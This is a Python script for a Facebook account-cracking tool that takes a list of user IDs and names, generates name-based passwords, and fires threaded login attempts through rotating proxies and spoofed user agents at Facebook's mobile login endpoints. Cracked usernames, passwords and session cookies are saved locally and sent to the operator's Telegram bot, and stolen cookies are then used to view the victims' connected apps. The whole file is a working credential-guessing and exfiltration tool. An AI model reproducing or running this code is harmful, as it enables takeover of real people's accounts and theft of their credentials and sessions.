



import os
import requests
Z = '\033[1;31m' #احمر
R = '\033[1;31m' #احمر
X = '\033[1;33m' #اصفر
F = '\033[2;32m' #اخضر
C = "\033[1;97m" #ابيض
B = '\033[2;36m'#سمائي
Y = '\033[1;34m' #ازرق فاتح.
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
#-------------------#
Z = '\033[1;31m' 
X = '\033[1;33m' 
F = '\033[2;32m' 
C = "\033[1;97m" 
B = '\033[2;36m'
Y = '\033[1;34m' 
C = "\033[1;97m" 
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33'
#-------------------#
os.system('clear')
print(f"""\x1b[38;5;57m
d8888b.  .d88b.  db      d888888b  .o88b. d88888b
88  `8D .8P  Y8. 88        `88'   d8P  Y8 88'
88oodD' 88    88 88         88    8P      88ooooo 
88~~~   88    88 88         88    8b      88~~~~~ 
88      `8b  d8' 88booo.   .88.   Y8b  d8 88.
88       `Y88P'  Y88888P Y888888P  `Y88P' Y88888P
\x1b[38;5;57m∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙∙""")
print('\n')
token=input(F+'Token Telegram: '+X)
print('\n')
ID=input(Y+'id Telegram : '+R)
os.system('clear')
from bs4 import BeautifulSoup as sop
import requests,bs4,json,os,sys,random,datetime,time,re
import requests
import time, datetime, os
from bs4 import BeautifulSoup as sop
import requests,bs4,json,os,sys,random,datetime,time,re
import requests
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import time
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
pretty.install()
CON=sol()

#DATE AND TIME
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
#USER-AGENTS
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox) 
except Exception as e:
	print(' \x1b[1;91m\x1b[1;96m\x1b[1;97m \x1b[1;96m[Mr.IPYTHONI]')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)

	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
#PROXYGEN
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://raw.githubusercontent.com/PSYCHO-PICCHI/ua/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
		
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ Login-pag ]--------------#
j = 'x'
i = 'mbasic'
a = 'm'
b = 'g'
c = 'free'
e = 'web'
f = 'developer'

W = '\x1b[1;97m' # write
R = '\x1b[1;91m' # red
G = '\x1b[1;92m' # FLAME-NAIM                                                                
Y = '\x1b[1;93m' # Yellow
B = '\x1b[1;94m' # bule
P = '\x1b[1;95m' # pink                                                                 
nb = '\x1b[1;96m' # Bule 50%
A = '\x1b[1;90m' # WARNA ABU ABU # current

ugen3=['Mozilla/5.0 (Linux; Android 11; Infinix X695 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/394.0.0.15.72;]','Mozilla/5.0 (Linux; Android 13; V2169 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/394.0.0.15.72;]','Mozilla/5.0 (Linux; Android 13; SM-M127F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]','Mozilla/5.0 (Linux; Android 11; itel S661LP Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]','Mozilla/5.0 (Linux; Android 7.1.1; N9560 Build/NMF26F; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/394.0.0.15.72;]','Mozilla/5.0 (Linux; Android 12; 22041219C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]','Mozilla/5.0 (Linux; Android 12; TECNO KH6 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/99.0.4844.88 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/391.2.0.20.404;]','Mozilla/5.0 (Linux; Android 11; MP02 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]','Mozilla/5.0 (Linux; Android 12; CPH2457 Build/SKQ1.220303.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]','Mozilla/5.0 (Linux; Android 11; T781SPP Build/RKQ1.210614.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]','Mozilla/5.0 (Linux; Android 10; Z555 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/388.0.0.23.106;]','Mozilla/5.0 (Linux; Android 8.0.0; CUBOT_P20 Build/O00623; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]','Mozilla/5.0 (Linux; Android 12; SM-M515F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/390.2.0.29.103;]','Mozilla/5.0 (Linux; Android 10; EVE-LX9N Build/HUAWEIEVE-LX9N; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/370.0.0.14.108;]','Mozilla/5.0 (Linux; Android 12; 4188S Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.118 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]','Mozilla/5.0 (Linux; Android 11; Armor 12 5G Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]','Mozilla/5.0 (Linux; Android 12; 22041216C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;]','Mozilla/5.0 (Linux; Android 10; CDY-NX9B Build/HUAWEICDY-N29B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/391.0.0.0.302;]','Mozilla/5.0 (Linux; Android 10; STS570 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/389.1.0.23.214;]','Mozilla/5.0 (Linux; Android 11; TECNO KG6p Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/393.0.0.18.92;']

RED = '\x1b[38;5;208m'
WHITE = '\033[1;92m'
GREEN = '\033[\033[1;92m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#------------------[ MACHINE-SUPPORT ]---------------#
def clear():
    os.system('clear')
    banner()
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "\x1b[1;91mPM"
else:
    a = ltx
    tag = "\x1b[1;96mAM"
         
def banner():
	print(f"""\033[1;97m
d8888b.  .d88b.  db      d888888b  .o88b. d88888b
88  `8D .8P  Y8. 88        `88'   d8P  Y8 88'
88oodD' 88    88 88         88    8P      88ooooo 
88~~~   88    88 88         88    8b      88~~~~~ 
88      `8b  d8' 88booo.   .88.   Y8b  d8 88.
88       `Y88P'  Y88888P Y888888P  `Y88P' Y88888P
\x1b[38;5;57m▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭""")
def linex():
	print('\x1b[38;5;57m▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭▭')
def menu():
	#ckx()
	clear()
	print(f"{W}[{G}\033[1;97m1{W}] 𝙲𝚁𝙰𝙲𝙺 𝙵𝙸𝙻𝙴\033[1;97m\033[1;92m ")
	linex()
	me=input(f'\33[1;97m[\33[1;97m?\33[1;97m]\33[1;97m 𝙲𝚑𝚘𝚒𝚌𝚎  :\33[1;92m ')
	if me in ["1", "01"]:
		fil()
	elif me in ["2", "02"]:
		os.system(' POLICE😎 ')
	
def fil():
    os.system('clear');
    D().plerr()
class D:
	def __init__(self):
		self.id = []
	def plerr(self):
		os.system("clear")
		banner()
		try:
			fileX = input ('\033[1;97m𝚂𝚊𝚟𝚎 𝚝𝚑𝚎 𝚏𝚒𝚕𝚎 𝚢𝚘𝚞 𝚌𝚛𝚎𝚊𝚝𝚎𝚍 : \33[1;92m') 
			for line in open(fileX, 'r').readlines():
				id.append(line.strip())
			print(WHITE+'\033[1;92m ids ➸  : \033[1;96m'+str(len(id)))
			for i in range(101):
				print("\r\033[1;93mLoading "+str(i)+"%",end="")
				time.sleep(0.02)
			Settings()
		except IOError:
			print("ERROR File %s"%(fileX));time.sleep(2)
			F()
			
def Settings():
	os.system("clear");banner()
	print(f'\033[1;97m[\33[1;97m1\33[1;97m]\33[1;97m[𝙿𝚛𝚎𝚜𝚜 1 𝚝𝚘 𝚕𝚘𝚐𝚒𝚗 𝚊𝚗𝚍 𝚌𝚛𝚊𝚌𝚔]\33[1;92m')
	print('\x1b[38;5;43m 🐧 Total ids\x1b[38;5;43m',str(len(id)))                                                                 
	hu = input('\33[1;97m[\33[1;97m?\33[1;97m]\33[1;97m𝙲𝚑𝚘𝚒𝚌𝚎 :\x1b[1;92m ')
	if hu in ['0','00']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['1','01']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print('\033[1;31m[\033[1;32m!\033[1;31m]\033[1;32mWRONG ✖️ ')
		exit()
	os.system("clear");banner()
	print(f'\033[1;97m[\33[1;97m1\33[1;97m]\33[1;97m 𝙼𝙴𝚃𝙾𝙳𝙴-𝙱-𝙰𝙿𝙸 \33[1;92m ')
	hc = input('\33[1;97m[\33[1;97m?\33[1;97m]\33[1;97m𝙲𝚑𝚘𝚒𝚌𝚎 :\x1b[1;92m ')
	if hc in ['1','01']:
		method.append('mobile')
	else:
		methode.append('mobile')
	pwplus=input('\033[1;97m[ 1 ] 𝙽𝙴𝚆 𝙸𝙳 [𝙶𝙾𝙾𝙳]\n[ 2 ] 𝙾𝙻𝙳 𝙸𝙳 [𝚅𝙴𝚁𝚈𝙶𝙾𝙾𝙳]\n\033[1;97m[\33[1;97m?\33[1;97m]\33[1;97m𝙲𝚑𝚘𝚒𝚌𝚎 :\33[1;92m')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		print(f'Add Password ?mhamad123-mhaad112233')
		pwku=input('\033[1;31m[\033[1;32m•\033[1;31m]\033[1;32mAdd Password₊: ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
	passwrd()
	exit() 
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	os.system('clear')
	banner()
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append('123'+frs)
					pwv.append('1234'+frs)
					pwv.append('12345'+frs)
					pwv.append(frs+'1122')
					pwv.append(frs+'2002')
					pwv.append(frs+'2000')
					pwv.append(frs+'1212')
					pwv.append(frs+'112233')
					pwv.append(frs+'11223344')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'1999')
					pwv.append(frs+'12345')
					pwv.append('12345678'+frs)
					pwv.append('123456789'+frs)
					pwv.append(frs+'12345678')
					pwv.append(frs+'1998')
					pwv.append(frs+'123456789')
					pwv.append('11223344'+frs)
					pwv.append('1122334455'+frs)
					pwv.append(frs+frs)
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append('123'+frs)
					pwv.append('1234'+frs)
					pwv.append('12345'+frs)
					pwv.append(frs+'1122')
					pwv.append(frs+'2002')
					pwv.append(frs+'2000')
					pwv.append(frs+'1212')
					pwv.append(frs+'112233')
					pwv.append(frs+'11223344')
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'1999')
					pwv.append(frs+'12345')
					pwv.append('12345678'+frs)
					pwv.append('123456789'+frs)
					pwv.append(frs+'12345678')
					pwv.append(frs+'1998')
					pwv.append(frs+'123456789')
					pwv.append('11223344'+frs)
					pwv.append('1122334455'+frs)
					pwv.append(frs+frs)
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(crackfree,idf,pwv)
			elif 'touch' in method:
				pool.submit(cracktouch,idf,pwv)
	print(f' \x1b[1;93m\x1b[1;92m√\x1b[1;92m➾OK➾: {h}%s '%(ok))
#--------------------[ METODE-B-API ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r{x}[{bo}Vip🦅{x}]{loop}{P}|\x1b[38;5;48m{ok}"),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'authority': 'm.facebook.com',
    'method': 'GET',
	'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type':'application/x-www-form-urlencoded',
    'origin':'https://m.facebook.com',
    'referer': 'https://m.facebook.com/',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Redmi Note 8 Pro"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				statuscp = f'''
└->USER : {idf}\n
└->PASS  : {pw}\n'''
				statuscp1 = nel(statuscp, style='red')
				cetak(nel(statuscp1, title=''))
				open('CP/'+cp,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				requests.get(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statuscp))     
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print('\n')
				statusok = f'''
└->USER : {idf}\n
└->PASS  : {pw}\n
└->COOKIES \n {kuki}'''
				statusok1 = nel(statusok, style='green')
				cetak(nel(statusok1, title='OK'))
				requests.get(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
				cek_RAJY(kuki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.128 Safari/537.36 FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.services;FBDV/EVR-L29;FBSV/10;FBLR/0;FBBK/1;FBCA/arm64-v8a:;]'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Check  Login Id Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Cannot Check Options (Check Login In Lite/Basic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
def cek_opsi():
	c = len(akun)
	hu = '#'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(u+'['+h+'•'+u+'] INPUT')
	cek = '# PROSESES CO'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s++++ %s ERROR=-     %s'%(b,kes,x))
				print('\r%s---> Separator Not Supported For This Program%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 11; TECNO KD8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4755.101 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = sop(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = sop(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Cannot Check Options%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s++++ %s|%s ----> ERROR       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '#INTERNET NO CONNECTED'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()
def cek_RAJY(kuki):
    session = requests.Session()
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
    sop = bs4.BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    try:
        for i in range(len(game)):
            print ("\r%s \033[0m-> %s%s"%(P,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
    except AttributeError:
        print ("\r    %s\033[0m cookie invalid"%(M))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
    sop = bs4.BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    try:
        for i in range(len(game)):
            print ("\r%s \033[0m-> %s"%(P,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
    except AttributeError:
        print ("\r    %s \033[0mcookie invalid"%(M))

if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.mkdir('DUMP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass

	menu()
	
Threads=[] 
for t in range(35):
 x = threading.Thread(target=passwrd)
 x.start()
 Threads.append(x)
for Th in Threads:
 passwrd()
